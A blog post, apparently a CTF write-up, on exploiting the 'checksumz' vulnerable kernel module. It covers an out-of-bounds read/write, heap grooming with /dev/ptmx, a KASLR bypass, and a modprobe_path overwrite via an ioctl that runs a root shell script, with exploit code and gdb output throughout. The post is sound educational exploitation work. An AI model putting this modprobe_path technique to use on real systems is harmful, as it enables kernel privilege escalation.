<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>checksumz | papichulo16</title>
  <link rel="stylesheet" href="/assets/css/style.css">
  
</head>
<body>
  <nav class="navbar">
    <a class="menu home-link" href="/"><img src="/assets/img/chavo.png" alt="El chavo" class="pfp-img">papichulo16</a>

    <div class="nav-right">
      <a href="https://github.com/papichulo16">Github</a>
      <a href="/contact">Contact</a>
      <a href="/reviews">Reviews</a>
      <div class="dropdown">
        <span><a href="/projects">Projects ▾</a></span>
        <div class="dropdown-content">
          
            <a href="/projects/1_magical_kernel.html">Magical Kernel</a>
          
            <a href="/projects/2_crap.html">C.R.A.P</a>
          
            <a href="/projects/6_ctf_writeups.html">PWN Writeups</a>
          
        </div>
      </div>
    </div>
  </nav>
  <hr>

  <main>
    <article class="post">

  <header class="post-header">
    <h1 class="post-title">checksumz</h1>
  </header>

  <div class="post-content">
    <h1 id="checksumz">checksumz</h1>

<p>Alright so this was my first kernel challenge that I have solved without looking at a writeup or anything and it was honestly really fun. I will say that I got some help from my buddy <a href="https://github.com/SolarDebris">Alex</a> but he was very good about not giving me the answer and just kind of guiding me/giving me resources to look into so that way I wasn’t dependent and could get the most out of this challenge.</p>

<p>So to get started, I installed a fork of <a href="https://github.com/bata24/gef">gef</a> that would help me debug the kernel better (as you will see later on) since the challenge had an <code class="language-plaintext highlighter-rouge">attach.gdb</code> script that could be attached with <code class="language-plaintext highlighter-rouge">sudo gdb -x attach.gdb</code>.</p>

<h3 id="challenge">challenge</h3>
<p>Alright now to the challenge, and thankfully, the challenge authors gave us the source code for the vulnerable kernel module. In the source code you can see that they changed up the functionality of <code class="language-plaintext highlighter-rouge">read</code>, <code class="language-plaintext highlighter-rouge">write</code>, and <code class="language-plaintext highlighter-rouge">lseek</code>. The bug was actually not that hard to find since basically all the program does is read and write from the location of where <code class="language-plaintext highlighter-rouge">buffer-&gt;state + buffer-&gt;pos</code> is. The <code class="language-plaintext highlighter-rouge">buffer-&gt;state</code> variable is the 512 byte buffer that we are writing to, while <code class="language-plaintext highlighter-rouge">buffer-&gt;pos</code> is the offset that we are writing to, modified by <code class="language-plaintext highlighter-rouge">lseek</code>. Here is the struct used for <code class="language-plaintext highlighter-rouge">buffer</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">checksum_buffer</span> <span class="p">{</span>
	<span class="n">loff_t</span> <span class="n">pos</span><span class="p">;</span>
	<span class="kt">char</span> <span class="n">state</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
	<span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>
	<span class="kt">size_t</span> <span class="n">read</span><span class="p">;</span>
	<span class="kt">char</span><span class="o">*</span> <span class="n">name</span><span class="p">;</span>
	<span class="kt">uint32_t</span> <span class="n">s1</span><span class="p">;</span>
	<span class="kt">uint32_t</span> <span class="n">s2</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<p>And here are the vulnerable lines of code in both read and write:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// read</span>
<span class="kt">ssize_t</span> <span class="n">copied</span> <span class="o">=</span> <span class="n">copy_to_iter</span><span class="p">(</span><span class="n">buffer</span><span class="o">-&gt;</span><span class="n">state</span> <span class="o">+</span> <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">pos</span><span class="p">,</span> <span class="n">min</span><span class="p">(</span><span class="n">bytes</span><span class="p">,</span> <span class="mi">256</span><span class="p">),</span> <span class="n">to</span><span class="p">);</span>

<span class="c1">// write</span>
<span class="kt">ssize_t</span> <span class="n">copied</span> <span class="o">=</span> <span class="n">copy_from_iter</span><span class="p">(</span><span class="n">buffer</span><span class="o">-&gt;</span><span class="n">state</span> <span class="o">+</span> <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">pos</span><span class="p">,</span> <span class="n">min</span><span class="p">(</span><span class="n">bytes</span><span class="p">,</span> <span class="mi">16</span><span class="p">),</span> <span class="n">from</span><span class="p">);</span>
</code></pre></div></div>

<p>Now with this in mind, that means that we can set <code class="language-plaintext highlighter-rouge">buffer-&gt;pos</code> to be whatever offset you want and then you basically have unlimited read and write. The only thing stopping you is the fact that <code class="language-plaintext highlighter-rouge">lseek</code> makes sure that <code class="language-plaintext highlighter-rouge">pos</code> is less than the <code class="language-plaintext highlighter-rouge">size</code> value.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">buffer</span><span class="o">-&gt;</span><span class="n">pos</span> <span class="o">&gt;=</span> <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span>
    <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">pos</span> <span class="o">=</span> <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</code></pre></div></div>

<p>Now this won’t matter though since you still have a 15 byte overwrite if you set <code class="language-plaintext highlighter-rouge">pos</code> to be 511 (<code class="language-plaintext highlighter-rouge">size</code> is 512) and then you can overwrite size so you can create any offset you want.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">overwrite_size</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">504</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>

  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="s">"AAAAAAAABBBBBBBB"</span><span class="p">;</span>
  <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Okay great! Now that we have unlimited read and write we can get a dump of the memory!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] GETTING MEMORY DUMP
0x4141414141414141 0x4242424242424242 
2: 0x0 0xff18dfa982303c00 
4: 0x1 0x0 
6: 0x0 0x0 
8: 0x0 0x0 
10: 0x0 0x0 
12: 0x0 0x0 
14: 0x0 0x0 
16: 0x0 0x0 
18: 0x0 0x0 
20: 0x0 0x0 
22: 0x0 0x0 
24: 0x0 0x0 
26: 0x0 0x0 
28: 0x0 0x0 
30: 0x0 0x0 
32: 0x6200000001 0x0 
...
</code></pre></div></div>

<p>Now with this in mind, we have to be mindful of where we are, in this case, we are in the <code class="language-plaintext highlighter-rouge">kmalloc-1024</code> heap (you can calculate this by just looking at the struct). So now, how do we get a kernel base leak since <code class="language-plaintext highlighter-rouge">kaslr</code> and <code class="language-plaintext highlighter-rouge">fg-kaslr</code> are both enabled? Well in this case, all I did was groom the heap by opening <code class="language-plaintext highlighter-rouge">/dev/ptmx</code> 200 times since it has a kernel address inside the heap. I found this out on <a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628">this article here</a>.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/ptmx"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">tmp</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/ptmx"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/checksumz"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">tmp</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/ptmx"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Now with this in mind, we can look at the memory dump and see a kernel address in index 36:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] GETTING MEMORY DUMP
0x4141414141414141 0x4242424242424242 
2: 0x0 0xff2aa7adc1f19400 
4: 0x1 0x0 
6: 0x0 0x0 
8: 0x0 0x0 
10: 0x0 0x0 
12: 0x0 0x0 
14: 0x0 0x0 
16: 0x0 0x0 
18: 0x0 0x0 
20: 0x0 0x0 
22: 0x0 0x0 
24: 0x0 0x0 
26: 0x0 0x0 
28: 0x0 0x0 
30: 0x0 0x0 
32: 0x6500000001 0x0 
34: 0xff2aa7adc194ec00 0xff2aa7adc1eaae00 
36: 0xffffffffabe89360 0xff2aa7adc1d8e5e0 
</code></pre></div></div>

<p>And this is how I got the base:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">get_kbase</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">kbase</span> <span class="o">=</span> <span class="n">mem</span><span class="p">[</span><span class="mi">36</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x1289360</span><span class="p">;</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"[*] KBASE LEAK: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Also you can see the kernel base by attaching gdb and running <code class="language-plaintext highlighter-rouge">kbase</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef&gt; kbase
[+] Wait for memory scan
kernel text:   0xffffffff81000000-0xffffffff82200000 (0x1200000 bytes)
kernel rodata: 0xffffffff82200000-0xffffffff828dd000 (0x6dd000 bytes)
kernel data:   0xffffffff828dd000-0xffffffff834f6000 (0xc19000 bytes)
</code></pre></div></div>

<p>So now that I got the kernel base, my next target is the <code class="language-plaintext highlighter-rouge">modprobe path</code>. The reason why is because <code class="language-plaintext highlighter-rouge">modprobe</code> is a program that is used for a lot of things file related, and one of them is in case the computer reads a file with unknown magic bytes. So if I change the <code class="language-plaintext highlighter-rouge">modprobe path</code> and then try and run a binary with unknown magic bytes, then the kernel will then run the program at the path that I wrote.</p>

<p>Okay cool, but how would I overwrite the path? Well luckily, the <code class="language-plaintext highlighter-rouge">checksum_buffer</code> struct has a pointer to a <code class="language-plaintext highlighter-rouge">name</code> character buffer and the <code class="language-plaintext highlighter-rouge">ioctl</code> allows you to change the name. So if I change the <code class="language-plaintext highlighter-rouge">name</code> pointer to the address of <code class="language-plaintext highlighter-rouge">modprobe path</code> and then call the ioctl telling it to let me change the name variable, then I will get control of the <code class="language-plaintext highlighter-rouge">modprobe path</code>.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">overwrite_modprobepath</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">528</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>

  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">modprobe</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x1b3f100</span><span class="p">;</span>
  <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">modprobe</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
   
  <span class="kt">char</span> <span class="n">new_path</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"/tmp/balls"</span><span class="p">;</span>
  <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">CHECKSUMZ_IOCTL_RENAME</span><span class="p">,</span> <span class="n">new_path</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef&gt; kmagic
[+] Wait for memory scan
kernel_base                                0xffffffff81000000 (0x1200000 bytes)
---------------------------------- Legend ----------------------------------
Symbol                                     Addr               Perm  (+Offset    ) -&gt; Value             
-------------------------------- Credential --------------------------------
commit_creds                               0xffffffff810b98a0 [R-X] (+0x000b98a0) -&gt; 0x4c655441fa1e0ff3
prepare_kernel_cred                        0xffffffff810b9d90 [R-X] (+0x000b9d90) -&gt; 0x85485355fa1e0ff3
init_cred                                  0xffffffff82a52ae0 [RW-] (+0x01a52ae0) -&gt; 0x0000000000000004
__sys_setuid                               0xffffffff810a0d20 [R-X] (+0x000a0d20) -&gt; 0x54415541001f0f66
init_task                                  0xffffffff82a0c940 [RW-] (+0x01a0c940) -&gt; 0x0000000000004000
------------------------------ Usermode helper ------------------------------
call_usermodehelper                        0xffffffff810a4780 [R-X] (+0x000a4780) -&gt; 0x4101f983fa1e0ff3
run_cmd                                             Not found
modprobe_path                              0xffffffff82b3f100 [RW-] (+0x01b3f100) -&gt; /tmp/balls &lt;==============
...
</code></pre></div></div>

<p>Now that I have done that, all I have to do is create a shell script that will write the flag into <code class="language-plaintext highlighter-rouge">/tmp</code> and then call an unknown binary, then I will be able to get the flag!</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">puts</span><span class="p">(</span><span class="s">"[*] OVERWRITING MOD PROBE PATH"</span><span class="p">);</span>
<span class="n">overwrite_modprobepath</span><span class="p">();</span>

<span class="n">puts</span><span class="p">(</span><span class="s">"[*] CREATING MODPROBE SCRIPT"</span><span class="p">);</span>
<span class="n">system</span><span class="p">(</span><span class="s">"echo -en '#!/bin/sh</span><span class="se">\n</span><span class="s">cat /dev/vda &gt; /tmp/flag' &gt; /tmp/balls"</span><span class="p">);</span>
<span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /tmp/balls"</span><span class="p">);</span>

<span class="n">puts</span><span class="p">(</span><span class="s">"[*] FINISHED OVERWRITING MOD PROBE PATH, NOW RUNNING BINARY WITH MODIFIED MAGIC BYTES"</span><span class="p">);</span>
<span class="n">system</span><span class="p">(</span><span class="s">"/home/user/magic"</span><span class="p">);</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~ $ cat /tmp/flag
irisctf{fakeflag}~ $ 
~ $ 
</code></pre></div></div>

<p>Overall I learned a lot from this challenge and also now I feel a lot more comfortable and less intimidated when doing kernel challenges. I can’t wait to try more of these kinds of challenges!</p>


  </div>

</article>

  </main>

  <footer>
    <hr>
    © 2025 papichulo16
  </footer>
</body>
</html>

